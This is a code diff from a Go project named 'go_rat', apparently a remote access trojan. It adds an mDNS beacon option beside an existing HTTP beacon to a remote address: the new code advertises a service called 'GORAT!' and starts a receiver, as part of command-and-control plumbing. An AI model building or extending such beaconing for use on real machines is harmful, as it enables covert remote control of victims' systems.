@@ -28,7 +28,11 @@ import (
 
 	"go_rat/pkg/shared_code/Beacons"
 	"go_rat/pkg/shared_code/Core"
+	"go_rat/pkg/shared_code/ErrorHandling"
 	"go_rat/pkg/shared_code/Intel"
+	"os"
+
+	"github.com/hashicorp/mdns"
 )
 
 /*
@@ -79,6 +83,25 @@ func main() {
 		case "http":
 			// function to call other beacons depending on second param
 			http_response, derp := Beacons.BeaconHTTP(Core.Remote_http_addr, Core.BEACONHTTPTYPE)
+
+		case "mdns":
+			// Setup our service export
+			servicename := "GORAT!"
+			host, derp := os.Hostname()
+			if derp != nil {
+				ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
+			}
+			info := []string{servicename}
+			service, derp := mdns.NewMDNSService(host, "_foobar._tcp", "", "", Core.MDNSPORT, nil, info)
+			if derp != nil {
+				ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
+			}
+			// assign to struct
+			fake_mdns_service := Core.FakeMDNSService{}
+			fake_mdns_service.Host = host
+			fake_mdns_service.Info = info[0]
+			fake_mdns_service.Service = *service
+			Beacons.StartMdnsReceiver(servicename, service, fake_mdns_service)
 
 		}
 	}
